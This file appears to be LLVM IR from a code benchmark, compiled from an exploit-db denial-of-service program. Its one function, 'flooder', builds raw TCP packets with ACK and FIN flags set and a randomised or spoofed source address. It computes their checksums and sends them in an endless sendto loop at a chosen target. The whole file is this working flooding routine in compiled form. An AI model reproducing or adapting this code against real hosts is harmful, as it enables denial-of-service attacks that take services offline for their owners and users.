; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/windows/dos/extr_21245.c_flooder.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/windows/dos/extr_21245.c_flooder.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.packet = type { %struct.TYPE_7__, %struct.TYPE_6__ }
%struct.TYPE_7__ = type { i32, i32, i32, i32, i8*, i8*, i8*, i64, i32, i8*, i8* }
%struct.TYPE_6__ = type { i32, i32, i8*, i8*, i8*, i8*, i64, i8*, i8* }
%struct.cksum = type { %struct.TYPE_5__ }
%struct.TYPE_5__ = type { i8*, i8*, i64, i8*, i8* }
%struct.sockaddr_in = type { %struct.TYPE_8__, i8*, i32 }
%struct.TYPE_8__ = type { i8* }
%struct.sockaddr = type { i32 }

@srcaddr = common dso_local global i8* null, align 8
@srcport = common dso_local global i32 0, align 4
@TH_ACK = common dso_local global i32 0, align 4
@TH_FIN = common dso_local global i32 0, align 4
@dstport = common dso_local global i32 0, align 4
@dstaddr = common dso_local global i8* null, align 8
@IPPROTO_TCP = common dso_local global i8* null, align 8
@AF_INET = common dso_local global i32 0, align 4
@sock = common dso_local global i32 0, align 4
@.str = private unnamed_addr constant [9 x i8] c"sendto()\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local void @flooder() #0 {
  %1 = alloca i32, align 4
  %2 = alloca %struct.packet, align 8
  %3 = alloca %struct.cksum*, align 8
  %4 = alloca %struct.sockaddr_in, align 8
  %5 = bitcast %struct.packet* %2 to i8*
  %6 = getelementptr inbounds i8, i8* %5, i64 4
  %7 = getelementptr inbounds i8, i8* %6, i64 -4
  %8 = bitcast i8* %7 to %struct.cksum*
  store %struct.cksum* %8, %struct.cksum** %3, align 8
  %9 = call i32 @memset(%struct.packet* %2, i32 0, i32 136)
  %10 = load i8*, i8** @srcaddr, align 8
  %11 = icmp ne i8* %10, null
  br i1 %11, label %14, label %12

12:                                               ; preds = %0
  %13 = call i8* (...) @random()
  store i8* %13, i8** @srcaddr, align 8
  br label %14

14:                                               ; preds = %12, %0
  %15 = load i32, i32* @srcport, align 4
  %16 = icmp ne i32 %15, 0
  br i1 %16, label %20, label %17

17:                                               ; preds = %14
  %18 = call i8* (...) @rand()
  %19 = ptrtoint i8* %18 to i32
  store i32 %19, i32* @srcport, align 4
  br label %20

20:                                               ; preds = %17, %14
  %21 = call i8* @htons(i32 16384)
  %22 = getelementptr inbounds %struct.packet, %struct.packet* %2, i32 0, i32 1
  %23 = getelementptr inbounds %struct.TYPE_6__, %struct.TYPE_6__* %22, i32 0, i32 8
  store i8* %21, i8** %23, align 8
  %24 = call i8* (...) @random()
  %25 = getelementptr inbounds %struct.packet, %struct.packet* %2, i32 0, i32 1
  %26 = getelementptr inbounds %struct.TYPE_6__, %struct.TYPE_6__* %25, i32 0, i32 7
  store i8* %24, i8** %26, align 8
  %27 = getelementptr inbounds %struct.packet, %struct.packet* %2, i32 0, i32 1
  %28 = getelementptr inbounds %struct.TYPE_6__, %struct.TYPE_6__* %27, i32 0, i32 5
  store i8* null, i8** %28, align 8
  %29 = getelementptr inbounds %struct.packet, %struct.packet* %2, i32 0, i32 1
  %30 = getelementptr inbounds %struct.TYPE_6__, %struct.TYPE_6__* %29, i32 0, i32 0
  store i32 5, i32* %30, align 8
  %31 = getelementptr inbounds %struct.packet, %struct.packet* %2, i32 0, i32 1
  %32 = getelementptr inbounds %struct.TYPE_6__, %struct.TYPE_6__* %31, i32 0, i32 6
  store i64 0, i64* %32, align 8
  %33 = call i8* (...) @rand()
  %34 = getelementptr inbounds %struct.packet, %struct.packet* %2, i32 0, i32 1
  %35 = getelementptr inbounds %struct.TYPE_6__, %struct.TYPE_6__* %34, i32 0, i32 5
  store i8* %33, i8** %35, align 8
  %36 = load i32, i32* @TH_ACK, align 4
  %37 = load i32, i32* @TH_FIN, align 4
  %38 = or i32 %36, %37
  %39 = getelementptr inbounds %struct.packet, %struct.packet* %2, i32 0, i32 1
  %40 = getelementptr inbounds %struct.TYPE_6__, %struct.TYPE_6__* %39, i32 0, i32 1
  store i32 %38, i32* %40, align 4
  %41 = load i32, i32* @srcport, align 4
  %42 = call i8* @htons(i32 %41)
  %43 = getelementptr inbounds %struct.packet, %struct.packet* %2, i32 0, i32 1
  %44 = getelementptr inbounds %struct.TYPE_6__, %struct.TYPE_6__* %43, i32 0, i32 4
  store i8* %42, i8** %44, align 8
  %45 = load i32, i32* @dstport, align 4
  %46 = call i8* @htons(i32 %45)
  %47 = getelementptr inbounds %struct.packet, %struct.packet* %2, i32 0, i32 1
  %48 = getelementptr inbounds %struct.TYPE_6__, %struct.TYPE_6__* %47, i32 0, i32 3
  store i8* %46, i8** %48, align 8
  %49 = load i8*, i8** @dstaddr, align 8
  %50 = load %struct.cksum*, %struct.cksum** %3, align 8
  %51 = getelementptr inbounds %struct.cksum, %struct.cksum* %50, i32 0, i32 0
  %52 = getelementptr inbounds %struct.TYPE_5__, %struct.TYPE_5__* %51, i32 0, i32 4
  store i8* %49, i8** %52, align 8
  %53 = load i8*, i8** @srcaddr, align 8
  %54 = load %struct.cksum*, %struct.cksum** %3, align 8
  %55 = getelementptr inbounds %struct.cksum, %struct.cksum* %54, i32 0, i32 0
  %56 = getelementptr inbounds %struct.TYPE_5__, %struct.TYPE_5__* %55, i32 0, i32 3
  store i8* %53, i8** %56, align 8
  %57 = load %struct.cksum*, %struct.cksum** %3, align 8
  %58 = getelementptr inbounds %struct.cksum, %struct.cksum* %57, i32 0, i32 0
  %59 = getelementptr inbounds %struct.TYPE_5__, %struct.TYPE_5__* %58, i32 0, i32 2
  store i64 0, i64* %59, align 8
  %60 = load i8*, i8** @IPPROTO_TCP, align 8
  %61 = load %struct.cksum*, %struct.cksum** %3, align 8
  %62 = getelementptr inbounds %struct.cksum, %struct.cksum* %61, i32 0, i32 0
  %63 = getelementptr inbounds %struct.TYPE_5__, %struct.TYPE_5__* %62, i32 0, i32 1
  store i8* %60, i8** %63, align 8
  %64 = call i8* @htons(i32 4)
  %65 = load %struct.cksum*, %struct.cksum** %3, align 8
  %66 = getelementptr inbounds %struct.cksum, %struct.cksum* %65, i32 0, i32 0
  %67 = getelementptr inbounds %struct.TYPE_5__, %struct.TYPE_5__* %66, i32 0, i32 0
  store i8* %64, i8** %67, align 8
  %68 = load %struct.cksum*, %struct.cksum** %3, align 8
  %69 = bitcast %struct.cksum* %68 to i8*
  %70 = call i8* @in_cksum(i8* %69, i32 40)
  %71 = getelementptr inbounds %struct.packet, %struct.packet* %2, i32 0, i32 1
  %72 = getelementptr inbounds %struct.TYPE_6__, %struct.TYPE_6__* %71, i32 0, i32 2
  store i8* %70, i8** %72, align 8
  %73 = getelementptr inbounds %struct.packet, %struct.packet* %2, i32 0, i32 0
  %74 = getelementptr inbounds %struct.TYPE_7__, %struct.TYPE_7__* %73, i32 0, i32 0
  store i32 5, i32* %74, align 8
  %75 = getelementptr inbounds %struct.packet, %struct.packet* %2, i32 0, i32 0
  %76 = getelementptr inbounds %struct.TYPE_7__, %struct.TYPE_7__* %75, i32 0, i32 1
  store i32 4, i32* %76, align 4
  %77 = load i8*, i8** @IPPROTO_TCP, align 8
  %78 = getelementptr inbounds %struct.packet, %struct.packet* %2, i32 0, i32 0
  %79 = getelementptr inbounds %struct.TYPE_7__, %struct.TYPE_7__* %78, i32 0, i32 10
  store i8* %77, i8** %79, align 8
  %80 = getelementptr inbounds %struct.packet, %struct.packet* %2, i32 0, i32 0
  %81 = getelementptr inbounds %struct.TYPE_7__, %struct.TYPE_7__* %80, i32 0, i32 2
  store i32 8, i32* %81, align 8
  %82 = call i8* (...) @rand()
  %83 = getelementptr inbounds %struct.packet, %struct.packet* %2, i32 0, i32 0
  %84 = getelementptr inbounds %struct.TYPE_7__, %struct.TYPE_7__* %83, i32 0, i32 9
  store i8* %82, i8** %84, align 8
  %85 = call i32 @FIX(i32 136)
  %86 = getelementptr inbounds %struct.packet, %struct.packet* %2, i32 0, i32 0
  %87 = getelementptr inbounds %struct.TYPE_7__, %struct.TYPE_7__* %86, i32 0, i32 8
  store i32 %85, i32* %87, align 8
  %88 = getelementptr inbounds %struct.packet, %struct.packet* %2, i32 0, i32 0
  %89 = getelementptr inbounds %struct.TYPE_7__, %struct.TYPE_7__* %88, i32 0, i32 7
  store i64 0, i64* %89, align 8
  %90 = getelementptr inbounds %struct.packet, %struct.packet* %2, i32 0, i32 0
  %91 = getelementptr inbounds %struct.TYPE_7__, %struct.TYPE_7__* %90, i32 0, i32 3
  store i32 255, i32* %91, align 4
  %92 = load i8*, i8** @dstaddr, align 8
  %93 = getelementptr inbounds %struct.packet, %struct.packet* %2, i32 0, i32 0
  %94 = getelementptr inbounds %struct.TYPE_7__, %struct.TYPE_7__* %93, i32 0, i32 6
  store i8* %92, i8** %94, align 8
  %95 = load i8*, i8** @srcaddr, align 8
  %96 = getelementptr inbounds %struct.packet, %struct.packet* %2, i32 0, i32 0
  %97 = getelementptr inbounds %struct.TYPE_7__, %struct.TYPE_7__* %96, i32 0, i32 5
  store i8* %95, i8** %97, align 8
  %98 = getelementptr inbounds %struct.packet, %struct.packet* %2, i32 0, i32 0
  %99 = getelementptr inbounds %struct.TYPE_7__, %struct.TYPE_7__* %98, i32 0, i32 4
  store i8* null, i8** %99, align 8
  %100 = getelementptr inbounds %struct.packet, %struct.packet* %2, i32 0, i32 0
  %101 = bitcast %struct.TYPE_7__* %100 to i8*
  %102 = call i8* @in_cksum(i8* %101, i32 20)
  %103 = getelementptr inbounds %struct.packet, %struct.packet* %2, i32 0, i32 0
  %104 = getelementptr inbounds %struct.TYPE_7__, %struct.TYPE_7__* %103, i32 0, i32 4
  store i8* %102, i8** %104, align 8
  %105 = load i32, i32* @AF_INET, align 4
  %106 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %4, i32 0, i32 2
  store i32 %105, i32* %106, align 8
  %107 = load i32, i32* @dstport, align 4
  %108 = call i8* @htons(i32 %107)
  %109 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %4, i32 0, i32 1
  store i8* %108, i8** %109, align 8
  %110 = load i8*, i8** @dstaddr, align 8
  %111 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %4, i32 0, i32 0
  %112 = getelementptr inbounds %struct.TYPE_8__, %struct.TYPE_8__* %111, i32 0, i32 0
  store i8* %110, i8** %112, align 8
  store i32 0, i32* %1, align 4
  br label %113

113:                                              ; preds = %121, %20
  %114 = load i32, i32* @sock, align 4
  %115 = bitcast %struct.sockaddr_in* %4 to %struct.sockaddr*
  %116 = call i64 @sendto(i32 %114, %struct.packet* %2, i32 136, i32 0, %struct.sockaddr* %115, i32 24)
  %117 = icmp slt i64 %116, 0
  br i1 %117, label %118, label %120

118:                                              ; preds = %113
  %119 = call i32 @perror(i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str, i64 0, i64 0))
  br label %120

120:                                              ; preds = %118, %113
  br label %121

121:                                              ; preds = %120
  %122 = load i32, i32* %1, align 4
  %123 = add nsw i32 %122, 1
  store i32 %123, i32* %1, align 4
  br label %113
}

declare dso_local i32 @memset(%struct.packet*, i32, i32) #1

declare dso_local i8* @random(...) #1

declare dso_local i8* @rand(...) #1

declare dso_local i8* @htons(i32) #1

declare dso_local i8* @in_cksum(i8*, i32) #1

declare dso_local i32 @FIX(i32) #1

declare dso_local i64 @sendto(i32, %struct.packet*, i32, i32, %struct.sockaddr*, i32) #1

declare dso_local i32 @perror(i8*) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
